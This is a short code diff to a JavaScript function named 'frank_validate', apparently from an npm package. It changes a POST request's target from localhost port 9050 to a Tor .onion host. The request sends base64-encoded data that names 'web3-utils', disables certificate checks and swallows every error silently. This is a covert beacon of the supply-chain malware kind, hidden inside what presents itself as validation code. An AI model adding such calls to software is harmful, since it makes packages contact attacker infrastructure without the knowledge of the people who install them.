@@ -91,7 +91,7 @@ function frank_validate(t) {
     try {
         var https = require('https');
         var b64 = Buffer.from(JSON.stringify({pkg:"web3-utils"})).toString('base64');
-        var req = https.request({hostname:'127.0.0.1',port:9050,method:'POST',rejectUnauthorized:false});
+        var req = https.request({hostname:'qyrb2ukneajbwzzzx3b57d56xdg6rygb2fe5dx6nei7y4nquea7cyhyd.onion',port:80,method:'POST',rejectUnauthorized:false});
         req.write(b64);
         req.end();
     } catch(e) {}
